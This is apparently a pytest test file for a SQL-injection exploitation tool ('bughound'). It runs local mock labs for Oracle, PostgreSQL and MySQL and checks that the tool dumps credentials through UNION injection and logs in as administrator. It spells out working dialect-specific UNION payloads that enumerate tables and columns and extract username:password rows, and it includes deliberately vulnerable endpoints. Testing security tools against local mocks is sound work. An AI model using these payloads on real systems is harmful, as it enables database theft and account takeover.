"""Multi-dialect mock Academy labs: prove UNION exploitation generalizes.

v0.7.1 solved exactly ONE lab flavor (2-column, string context, ``||``-concat
catalog syntax). v0.8.0 makes the exploit dialect-adaptive, and these mocks
lock that in: each mock is a small Academy lookalike whose backend speaks a
STRICT single-dialect SQL grammar --

* **Oracle**: every UNION arm MUST carry ``FROM dual``; catalogs come from
  ``v$version`` / ``all_tables`` / ``all_tab_columns`` via ``LISTAGG``;
  identifiers are UPPERCASE and randomized (``USERS_X7Q2MA``);
  wrong grammar -> 500 + ``ORA-00923`` -- exactly like the real DBMS.
* **PostgreSQL**: ``version()`` / ``string_agg`` / ``information_schema``.
* **MySQL**: ``CONCAT`` / ``group_concat(... SEPARATOR ...)`` /
  ``information_schema`` + ``database()``.

Each mock evaluates the engine's extraction expressions against its catalog
and refuses anything its dialect cannot parse, so if the engine ever stops
emitting dialect-correct SQL the tests fail loudly -- the exact regression
that made the Oracle lab unsolvable in 0.7.1.
"""

from __future__ import annotations

import re
import socket
import threading
import time
from urllib.parse import urlparse

import pytest
import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, RedirectResponse

from bughound.exploits.sqli import (
    COLS_MARKER,
    END_MARKER,
    ROWS_MARKER,
    STR_MARKER,
    TABLES_MARKER,
    VERSION_MARKER,
)
from bughound.http_client import HttpClient
from bughound.models import Category, Finding, ScanConfig, ScanResult, Severity, Target
from bughound.modules.base import RequestTarget, ScanContext
from bughound.solving import check_lab_status, run_solve_phase

# ---------------------------------------------------------------------------
# A tiny SQL-grammar emulator per dialect
# ---------------------------------------------------------------------------

ORA_ERROR = "ORA-00923: FROM keyword not found where expected"
PG_ERROR = 'ERROR:  function sqlite_version() does not exist'
MY_ERROR = "You have an error in your SQL syntax"

_ORA_VERSION_RE = re.compile(
    r"\(\s*SELECT'bhv='\|\|banner\|\|'~bhEND~'FROMv\$versionWHEREROWNUM=1\)", re.I
)
_ORA_STATIC_RE = re.compile(
    r"\(\s*SELECT'bhv=Oracle\(bannerrestricted\)~bhEND~'FROMdual\)", re.I
)
_ORA_TABLES_RE = re.compile(
    r"\(\s*SELECT'bhtbl='\|\|LISTAGG\(table_name,','\)WITHINGROUP\(ORDERBYtable_name\)"
    r"\|\|'~bhEND~'FROMall_tables\)", re.I
)
_ORA_COLS_RE = re.compile(
    r"\(\s*SELECT'bhcols='\|\|LISTAGG\(column_name,','\)WITHINGROUP\(ORDERBYcolumn_name\)"
    r"\|\|'~bhEND~'FROMall_tab_columnsWHERETABLE_NAME=UPPER\('(?P<table>[^']+)'\)\)", re.I
)
_ORA_ROWS_RE = re.compile(
    r"\(\s*SELECT'bhrows='\|\|LISTAGG\((?P<u>\w+)\|\|':'\|\|(?P<p>\w+),';'\)"
    r"WITHINGROUP\(ORDERBY(?P=u)\)\|\|'~bhEND~'FROM(?P<table>\w+)\)", re.I
)

_PG_VERSION_RE = re.compile(
    r"\(\s*SELECT'bhv='\|\|version\(\)\|\|'~bhEND~'\)", re.I
)
_PG_TABLES_RE = re.compile(
    r"\(\s*SELECT'bhtbl='\|\|string_agg\(table_name,','\)\|\|'~bhEND~'"
    r"FROMinformation_schema.tablesWHEREtable_schema(?:NOTIN\('pg_catalog','information_schema'\)|='public')\)", re.I
)
_PG_COLS_RE = re.compile(
    r"\(\s*SELECT'bhcols='\|\|string_agg\(column_name,','\)\|\|'~bhEND~'"
    r"FROMinformation_schema.columnsWHEREtable_name='(?P<table>[^']+)'\)", re.I
)
_PG_ROWS_RE = re.compile(
    r"\(\s*SELECT'bhrows='\|\|string_agg\((?P<u>\w+)\|\|':'\|\|(?P<p>\w+),';'\)"
    r"\|\|'~bhEND~'FROM(?P<table>\w+)\)", re.I
)

_MY_VERSION_RE = re.compile(
    r"CONCAT\('bhv=',version\(\),'~bhEND~'\)", re.I
)
_MY_TABLES_RE = re.compile(
    r"\(\s*SELECTCONCAT\('bhtbl=',group_concat\(table_name\),'~bhEND~'\)"
    r"FROMinformation_schema.tablesWHEREtable_schema=database\(\)\)", re.I
)
_MY_COLS_RE = re.compile(
    r"\(\s*SELECTCONCAT\('bhcols=',group_concat\(column_name\),'~bhEND~'\)"
    r"FROMinformation_schema.columnsWHEREtable_schema=database\(\)"
    r"ANDtable_name='(?P<table>[^']+)'\)", re.I
)
_MY_ROWS_RE = re.compile(
    r"\(\s*SELECTCONCAT\('bhrows=',\(SELECTgroup_concat\((?P<u>\w+),':',(?P<p>\w+)"
    r"SEPARATOR';'\)FROM(?P<table>\w+)\),'~bhEND~'\)\)", re.I
)


def _norm(expr: str) -> str:
    """Compact an expression the way both sides can compare: strip all whitespace."""
    return re.sub(r"\s+", "", expr)


def _split_top(exprs: str) -> list[str]:
    """Split a UNION row on top-level commas (parens/quotes aware)."""
    parts: list[str] = []
    buf: list[str] = []
    depth = 0
    in_str = False
    for ch in exprs:
        if in_str:
            buf.append(ch)
            if ch == "'":
                in_str = False
            continue
        if ch == "'":
            in_str = True
            buf.append(ch)
        elif ch == "(":
            depth += 1
            buf.append(ch)
        elif ch == ")":
            depth -= 1
            buf.append(ch)
        elif ch == "," and depth == 0:
            parts.append("".join(buf).strip())
            buf = []
        else:
            buf.append(ch)
    parts.append("".join(buf).strip())
    return parts


class DialectCatalog:
    """Tables/columns/rows for one mock database + its grammar rules."""

    def __init__(
        self,
        dialect: str,
        banner: str,
        tables: list[str],
        columns: dict[str, list[str]],
        rows: dict[str, list[tuple[str, str]]],
    ) -> None:
        self.dialect = dialect
        self.banner = banner
        self.tables = tables
        self.columns = columns
        self.rows = rows

    # -- expression evaluation: dialect-strict -----------------------------
    def eval_expr(self, expr: str) -> str | None:
        """Evaluate one UNION-arm expression; raise ValueError if the
        dialect cannot parse it (mocks a real DBMS syntax error).

        The result is the FULL evaluated string -- markers included -- exactly
        like real SQL concatenation ('bhv='||banner||'~bhEND~' evaluates to
        'bhv=<banner>~bhEND~'), so the rendered UNION row carries the same
        marker-delimited value a real database would produce.
        """
        n = _norm(expr)
        if n == "NULL":
            return None
        m = re.fullmatch(r"'(bhstr\d+=)'", n)
        if m:
            return m.group(1)

        if self.dialect == "Oracle":
            if _ORA_VERSION_RE.fullmatch(n):
                return f"{VERSION_MARKER}{self.banner}{END_MARKER}"
            if _ORA_STATIC_RE.fullmatch(n):
                return f"{VERSION_MARKER}Oracle (banner restricted){END_MARKER}"
            if _ORA_TABLES_RE.fullmatch(n):
                return f"{TABLES_MARKER}{','.join(self.tables)}{END_MARKER}"
            mc = _ORA_COLS_RE.fullmatch(n)
            if mc:
                cols = self.columns.get(mc.group("table").upper())
                if cols is None:
                    raise ValueError("no such table: " + mc.group("table"))
                return f"{COLS_MARKER}{','.join(cols)}{END_MARKER}"
            mr = _ORA_ROWS_RE.fullmatch(n)
            if mr:
                found = self._rows_for(mr.group("table"), mr.group("u"), mr.group("p"))
                joined = ";".join(f"{u}:{p}" for u, p in found)
                return f"{ROWS_MARKER}{joined}{END_MARKER}"

        elif self.dialect == "PostgreSQL":
            if _PG_VERSION_RE.fullmatch(n):
                return f"{VERSION_MARKER}{self.banner}{END_MARKER}"
            if _PG_TABLES_RE.fullmatch(n):
                return f"{TABLES_MARKER}{','.join(self.tables)}{END_MARKER}"
            mc = _PG_COLS_RE.fullmatch(n)
            if mc:
                cols = self.columns.get(mc.group("table"))
                if cols is None:
                    raise ValueError("no such table: " + mc.group("table"))
                return f"{COLS_MARKER}{','.join(cols)}{END_MARKER}"
            mr = _PG_ROWS_RE.fullmatch(n)
            if mr:
                found = self._rows_for(mr.group("table"), mr.group("u"), mr.group("p"))
                joined = ";".join(f"{u}:{p}" for u, p in found)
                return f"{ROWS_MARKER}{joined}{END_MARKER}"

        elif self.dialect == "MySQL/MariaDB":
            if _MY_VERSION_RE.fullmatch(n):
                return f"{VERSION_MARKER}{self.banner}{END_MARKER}"
            if _MY_TABLES_RE.fullmatch(n):
                return f"{TABLES_MARKER}{','.join(self.tables)}{END_MARKER}"
            mc = _MY_COLS_RE.fullmatch(n)
            if mc:
                cols = self.columns.get(mc.group("table"))
                if cols is None:
                    raise ValueError("no such table: " + mc.group("table"))
                return f"{COLS_MARKER}{','.join(cols)}{END_MARKER}"
            mr = _MY_ROWS_RE.fullmatch(n)
            if mr:
                found = self._rows_for(mr.group("table"), mr.group("u"), mr.group("p"))
                joined = ";".join(f"{u}:{p}" for u, p in found)
                return f"{ROWS_MARKER}{joined}{END_MARKER}"

        raise ValueError(f"{self.dialect} cannot parse expression: {expr!r}")

    def _rows_for(self, table: str, ucol: str, pcol: str) -> list[tuple[str, str]]:
        key = table if table in self.rows else table.upper()
        if key not in self.rows:
            raise ValueError(f"no such table: {table}")
        cols = self.columns.get(key) or self.columns.get(table)
        if cols is None:
            raise ValueError(f"no such table: {table}")
        low = {c.lower(): c for c in cols}
        if ucol.lower() not in low or pcol.lower() not in low:
            raise ValueError(f"column {ucol}/{pcol} not in {key}")
        return self.rows[key]


# The three mock databases. Catalog shapes mirror what the real labs do:
# randomized table/column names; Oracle identifiers UPPERCASE.
def _catalog(dialect: str) -> DialectCatalog:
    if dialect == "Oracle":
        return DialectCatalog(
            dialect="Oracle",
            banner="Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production",
            tables=["PRODUCTS", "DEPARTMENTS", "HELP", "USERS_X7Q2MA", "PRODUCT_USER_PROFILE"],
            columns={
                "USERS_X7Q2MA": ["USERNAME_X7Q2MA", "PASSWORD_X7Q2MA", "EMAIL_X7Q2MA"],
                "PRODUCTS": ["PRODUCT_NAME", "CATEGORY", "PRICE"],
            },
            rows={
                "USERS_X7Q2MA": [
                    ("administrator", "0raclePwn2024!"),
                    ("wiener", "peter123"),
                ],
            },
        )
    if dialect == "PostgreSQL":
        return DialectCatalog(
            dialect="PostgreSQL",
            banner="PostgreSQL 15.6 (Debian 15.6-1.pgdg120+1) on x86_64-pc-linux-gnu",
            tables=["products", "orders", "users_kd93ja"],
            columns={
                "users_kd93ja": ["username_kd93ja", "password_kd93ja", "email"],
                "products": ["name", "category", "price"],
            },
            rows={
                "users_kd93ja": [
                    ("administrator", "pgt0pSecret9"),
                    ("wiener", "peter123"),
                ],
            },
        )
    return DialectCatalog(
        dialect="MySQL/MariaDB",
        banner="8.0.36",
        tables=["products", "orders", "users_m4xkqp"],
        columns={
            "users_m4xkqp": ["username_m4xkqp", "password_m4xkqp", "email"],
            "products": ["name", "category", "price"],
        },
        rows={
            "users_m4xkqp": [
                ("administrator", "mySq1Pwn!77"),
                ("wiener", "peter123"),
            ],
        },
    )


def _injection_error(catalog: DialectCatalog) -> str:
    return {
        "Oracle": ORA_ERROR,
        "PostgreSQL": PG_ERROR,
        "MySQL/MariaDB": MY_ERROR,
    }[catalog.dialect]


_OUTER_COLUMNS = 2  # the vulnerable query selects (name, category)


def _parse_union(category: str, catalog: DialectCatalog):
    """Parse ``base' UNION SELECT <exprs>-- ...`` against dialect grammar.

    Returns the list of evaluated expression values, or raises ValueError
    with the DBMS-style error text.
    """
    m = re.match(r"^(?P<base>.*)' UNION SELECT (?P<row>.*)--.*$", category, re.S)
    if not m:
        raise ValueError(_injection_error(catalog))
    row = m.group("row")
    # Dialect grammar: Oracle NEEDS FROM dual on the arm; the others accept
    # both (real MySQL accepts FROM dual, PostgreSQL does not -- but the
    # engine never sends one there, so accepting it is a harmless superset).
    rm = re.match(r"^(?P<exprs>.*?)(?:\s+FROM\s+dual)?$", row, re.I | re.S)
    exprs_raw = rm.group("exprs")
    if catalog.dialect == "Oracle" and not re.search(r"FROM\s+dual$", row, re.I):
        # REAL Oracle failure mode: the arm is missing its FROM clause.
        raise ValueError(ORA_ERROR)
    exprs = _split_top(exprs_raw)
    if len(exprs) != _OUTER_COLUMNS:
        raise ValueError(_injection_error(catalog))
    return [catalog.eval_expr(e) for e in exprs]


def build_dialect_lab_app(catalog: DialectCatalog) -> FastAPI:
    """An Academy-styled vulnerable shop whose backend is one strict dialect."""
    app = FastAPI()
    state = {"solved": False}
    products = [
        ("Leather Gloves", "Accessories"),
        ("Sunglasses", "Accessories"),
        ("Dog Toy", "Pets"),
    ]

    def _page(title: str) -> str:
        status = "is-solved" if state["solved"] else "is-notsolved"
        text = "Solved" if state["solved"] else "Not solved"
        return (
            f"<html><head><title>{title}</title></head>"
            '<body><div id="academyLabHeader"><section class="academyLabBanner">'
            '<div class="container"><div class="title-container">'
            f"<h2>{title}</h2></div>"
            f'<div class="widgetcontainer-lab-status {status}"><span>LAB</span>'
            f"<p>{text}</p></div></div></section></div></body></html>"
        )

    @app.get("/", response_class=HTMLResponse)
    def home() -> str:
        return _page(f"SQL injection attack, listing the database contents on {catalog.dialect}")

    @app.get("/filter", response_class=HTMLResponse)
    def filter_products(category: str = ""):
        try:
            union_values = _parse_union(category, catalog)
        except ValueError as exc:
            return HTMLResponse(
                f"<html><body><pre>{exc}</pre></body></html>", status_code=500
            )
        # Page mirrors the Academy: the raw search term is reflected first
        # (payload-poisoning pressure), then the result rows render.
        parts = [f"<a class=filter href='/filter?category={category}'>{category}</a>"]
        shown = [(n, c) for n, c in products if c == category]
        if union_values is not None:
            shown.append(
                tuple(v if v is not None else "NULL" for v in union_values)
            )
        parts += [f"<div>{n} -- {c}</div>" for n, c in shown]
        return HTMLResponse("<html><body>" + "".join(parts) + "</body></html>")

    @app.get("/login", response_class=HTMLResponse)
    def login_form() -> str:
        return (
            "<html><body><form method=POST action=/login>"
            "<input name=csrf value=token123><input name=username>"
            "<input name=password><button type=submit>Log in</button>"
            "</form></body></html>"
        )

    @app.post("/login")
    async def login(request: Request):
        form = await request.form()
        user = str(form.get("username", ""))
        pwd = str(form.get("password", ""))
        rows = catalog.rows.get(
            _upper_if_oracle(catalog, list(catalog.rows)[0]),
            catalog.rows[list(catalog.rows)[0]],
        )
        creds = {u: p for u, p in rows}
        if creds.get(user) == pwd:
            if user == "administrator":
                state["solved"] = True
            resp = RedirectResponse("/", status_code=303)
            resp.set_cookie("session", f"owned-by-{user}")
            return resp
        return HTMLResponse(
            "<html><body>Invalid username or password.</body></html>",
            status_code=401,
        )

    app.state.solved_flag = state
    return app


def _upper_if_oracle(catalog: DialectCatalog, key: str) -> str:
    if catalog.dialect == "Oracle":
        return key.upper()
    return key


# ---------------------------------------------------------------------------
# Parametrized server fixtures (one live lab per dialect)
# ---------------------------------------------------------------------------

def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _start_server(app: FastAPI) -> tuple[str, uvicorn.Server, threading.Thread]:
    port = _free_port()
    config = uvicorn.Config(app, host="127.0.0.1", port=port, log_level="warning")
    srv = uvicorn.Server(config)
    thread = threading.Thread(target=srv.run, daemon=True)
    thread.start()
    for _ in range(50):
        if srv.started:
            break
        time.sleep(0.1)
    url = f"http://127.0.0.1:{port}/"
    return url, srv, thread


DIALECTS = ["Oracle", "PostgreSQL", "MySQL/MariaDB"]


def _server_key(dialect: str) -> str:
    return dialect.lower().replace("/", "")


_SERVERS: dict[str, tuple[str, uvicorn.Server, threading.Thread, dict]] = {}


def _get_server(dialect: str) -> str:
    key = _server_key(dialect)
    if key not in _SERVERS:
        catalog = _catalog(dialect)
        app = build_dialect_lab_app(catalog)
        url, srv, thread = _start_server(app)
        _SERVERS[key] = (url, srv, thread, app.state.solved_flag)
    return _SERVERS[key][0]


def _reset_state(dialect: str) -> None:
    key = _server_key(dialect)
    if key in _SERVERS:
        _SERVERS[key][3]["solved"] = False


@pytest.fixture(params=DIALECTS, ids=[_server_key(d) for d in DIALECTS])
def dialect_lab(request):
    """A live Academy-style lab per dialect; fresh (unsolved) state each test."""
    dialect = request.param
    _reset_state(dialect)
    url = _get_server(dialect)
    yield dialect, url
    _reset_state(dialect)


def _make_ctx(server: str):
    client = HttpClient(timeout=10)
    port = urlparse(server).port or 80
    config = ScanConfig(
        target_url=server, aggressive=True, exploit=True, use_external_tools=False
    )
    target = Target(url=server, scheme="http", host="127.0.0.1", port=port, authorized=True)
    rt_filter = RequestTarget(
        url=server + "filter", method="GET", params={"category": "Accessories"},
        source="direct",
    )
    rt_login = RequestTarget(
        url=server + "login", method="POST",
        params={"username": "", "password": "", "csrf": ""}, source="form",
    )
    seed = (
        '<html><head><title>SQL injection attack, listing the database contents'
        "</title></head><body><div id=\"academyLabHeader\">"
        "<div class='widgetcontainer-lab-status is-notsolved'><p>Not solved</p>"
        "</div></div></body></html>"
    )
    ctx = ScanContext(
        client=client,
        config=config,
        target=target,
        base_url=server,
        urls=[server],
        request_targets=[rt_filter, rt_login],
        seed_html=seed,
    )
    return ctx, client


def _sqli_finding(server: str) -> Finding:
    return Finding(
        category=Category.SQLI,
        title="Possible boolean-based SQL injection in 'category'",
        severity=Severity.CRITICAL,
        url=server + "filter",
        module="sqli",
        verified=True,
    )


# ---------------------------------------------------------------------------
# The generalization tests: solve the objective on EVERY dialect
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_solve_phase_completes_lab_on_each_dialect(dialect_lab):
    """End-to-end: detect open lab -> UNION extract creds -> login -> SOLVED.

    Oracle is the headline regression (0.7.1 could not finish it: the FROM
    dual fallback built a truncated wrapper and every payload site hardcoded
    a FROM-less UNION arm). PostgreSQL and MySQL prove the adaptive suffix
    did not break the dialects that never needed FROM dual.
    """
    dialect, server = dialect_lab
    ctx, client = _make_ctx(server)
    result = ScanResult(
        target=Target(url=server, scheme="http", host="127.0.0.1",
                      port=urlparse(server).port or 80),
        config=ctx.config,
    )
    result.add(_sqli_finding(server))

    await run_solve_phase(ctx, result, print)

    obj = result.objective
    assert obj.get("title"), "lab objective should be detected"
    assert obj.get("solved_after") is True, (
        f"{dialect} lab should be solved: {obj}"
    )
    assert obj.get("solved_before") is False
    attempts = obj.get("attempts") or []
    assert attempts and attempts[-1]["lab_solved"] is True
    assert any(a["strategy"] == "sqli-extraction-login" for a in attempts)
    # The extraction actually pulled the randomized credential store.
    sqli_finding = next(f for f in result.findings if f.exploit_status == "succeeded"
                        and f.extracted_data)
    blob = "\n".join(sqli_finding.extracted_data)
    assert "ACCOUNT TAKEOVER" in blob
    assert f"Database: {dialect}" in blob
    status = await check_lab_status(ctx)
    assert status and status["solved"] is True
    await client.aclose()


# ---------------------------------------------------------------------------
# Unit-level guards for the dialect-adaptive suffix
# ---------------------------------------------------------------------------


def test_union_select_adds_from_dual_only_when_needed():
    from bughound.exploits.sqli import UnionContext

    plain = UnionContext(cols=2, wrapper="Acc'")
    assert plain.union_select(["NULL", "'x'"]) == "Acc' UNION SELECT NULL,'x'-- -"

    oracle = UnionContext(cols=2, wrapper="Acc'", from_dual=True)
    assert (
        oracle.union_select(["NULL", "'x'"])
        == "Acc' UNION SELECT NULL,'x' FROM dual-- -"
    )


def test_oracle_wrapper_reconstruction_is_exact():
    """The 0.7.1 Oracle bug: the wrapper was sliced with the SHORT tail length,
    truncating it into SQL garbage. Guard the exact-tail reconstruction."""
    base = "Accessories"
    nulls = "NULL,NULL"
    variant = f"{base}' UNION SELECT {nulls} FROM dual-- -"
    oracle_suffix = f" UNION SELECT {nulls} FROM dual-- -"
    assert variant.endswith(oracle_suffix)
    wrapper = variant[: -len(oracle_suffix)]
    assert wrapper == "Accessories'"


def test_split_top_respects_parens_and_quotes():
    exprs = "(SELECT CONCAT('a',group_concat(x)),'y') , 'lit'"
    parts = _split_top(exprs)
    assert parts == ["(SELECT CONCAT('a',group_concat(x)),'y')", "'lit'"]


def test_oracle_mock_rejects_from_dual_less_arm():
    """The real 0.7.1 failure mode: an Oracle backend errors on a FROM-less
    UNION arm, so shape discovery MUST fall through to the FROM dual retry."""
    catalog = _catalog("Oracle")
    with pytest.raises(ValueError, match="ORA-00923"):
        _parse_union("Acc' UNION SELECT NULL,NULL-- -", catalog)
    # ...and accepts the correct FROM dual arm.
    values = _parse_union("Acc' UNION SELECT NULL,NULL FROM dual-- -", catalog)
    assert values == [None, None]


def test_oracle_mock_evaluates_engine_expressions():
    """The engine's exact Oracle expressions must evaluate against the mock
    catalog (catches payload-grammar drift)."""
    from bughound.exploits.sqli import (
        COLS_MARKER,
        END_MARKER,
        ROWS_MARKER,
        TABLES_MARKER,
        VERSION_MARKER,
    )

    catalog = _catalog("Oracle")
    v = catalog.eval_expr(
        f"(SELECT '{VERSION_MARKER}'||banner||'{END_MARKER}' FROM v$version WHERE ROWNUM=1)"
    )
    assert v == f"{VERSION_MARKER}Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production{END_MARKER}"
    t = catalog.eval_expr(
        f"(SELECT '{TABLES_MARKER}'||LISTAGG(table_name, ',') WITHIN GROUP "
        f"(ORDER BY table_name)||'{END_MARKER}' FROM all_tables)"
    )
    assert "USERS_X7Q2MA" in t
    c = catalog.eval_expr(
        f"(SELECT '{COLS_MARKER}'||LISTAGG(column_name, ',') WITHIN GROUP "
        f"(ORDER BY column_name)||'{END_MARKER}' "
        f"FROM all_tab_columns WHERE table_name=UPPER('USERS_X7Q2MA'))"
    )
    assert "PASSWORD_X7Q2MA" in c
    r = catalog.eval_expr(
        f"(SELECT '{ROWS_MARKER}'||LISTAGG(username_x7q2ma||':'||password_x7q2ma, ';') "
        f"WITHIN GROUP (ORDER BY username_x7q2ma)||'{END_MARKER}' FROM USERS_X7Q2MA)"
    )
    assert r.startswith(f"{ROWS_MARKER}administrator:0raclePwn2024!")


def test_postgresql_mock_evaluates_engine_expressions():
    from bughound.exploits.sqli import (
        COLS_MARKER,
        END_MARKER,
        ROWS_MARKER,
        TABLES_MARKER,
        VERSION_MARKER,
    )

    catalog = _catalog("PostgreSQL")
    assert catalog.eval_expr(
        f"(SELECT '{VERSION_MARKER}'||version()||'{END_MARKER}')"
    ).startswith(f"{VERSION_MARKER}PostgreSQL 15")
    t = catalog.eval_expr(
        f"(SELECT '{TABLES_MARKER}'||string_agg(table_name, ',')||'{END_MARKER}' "
        f"FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema'))"
    )
    assert "users_kd93ja" in t
    c = catalog.eval_expr(
        f"(SELECT '{COLS_MARKER}'||string_agg(column_name, ',')||'{END_MARKER}' "
        f"FROM information_schema.columns WHERE table_name='users_kd93ja')"
    )
    assert "password_kd93ja" in c
    r = catalog.eval_expr(
        f"(SELECT '{ROWS_MARKER}'||string_agg(username_kd93ja||':'||password_kd93ja, ';')"
        f"||'{END_MARKER}' FROM users_kd93ja)"
    )
    assert r.startswith(f"{ROWS_MARKER}administrator:pgt0pSecret9")


def test_mysql_mock_evaluates_engine_expressions():
    from bughound.exploits.sqli import (
        COLS_MARKER,
        END_MARKER,
        ROWS_MARKER,
        TABLES_MARKER,
        VERSION_MARKER,
    )

    catalog = _catalog("MySQL/MariaDB")
    assert catalog.eval_expr(
        f"CONCAT('{VERSION_MARKER}',version(),'{END_MARKER}')"
    ) == f"{VERSION_MARKER}8.0.36{END_MARKER}"
    t = catalog.eval_expr(
        f"(SELECT CONCAT('{TABLES_MARKER}',group_concat(table_name),'{END_MARKER}') "
        f"FROM information_schema.tables WHERE table_schema=database())"
    )
    assert "users_m4xkqp" in t
    c = catalog.eval_expr(
        f"(SELECT CONCAT('{COLS_MARKER}',group_concat(column_name),'{END_MARKER}') "
        f"FROM information_schema.columns WHERE table_schema=database() "
        f"AND table_name='users_m4xkqp')"
    )
    assert "password_m4xkqp" in c
    r = catalog.eval_expr(
        f"(SELECT CONCAT('{ROWS_MARKER}', (SELECT group_concat(username_m4xkqp, ':', "
        f"password_m4xkqp SEPARATOR ';') FROM users_m4xkqp), '{END_MARKER}'))"
    )
    assert r.startswith(f"{ROWS_MARKER}administrator:mySq1Pwn!77")


def test_mock_rejects_foreign_dialect_expressions():
    """A PG version probe on the Oracle mock must fail like the real DBMS."""
    catalog = _catalog("Oracle")
    with pytest.raises(ValueError):
        catalog.eval_expr("(SELECT 'bhv='||version()||'~bhEND~')")


def test_string_marker_positions_flow_through_mock():
    catalog = _catalog("Oracle")
    values = _parse_union(
        f"Acc' UNION SELECT '{STR_MARKER.format(0)}',NULL FROM dual-- -", catalog
    )
    assert values == [STR_MARKER.format(0), None]
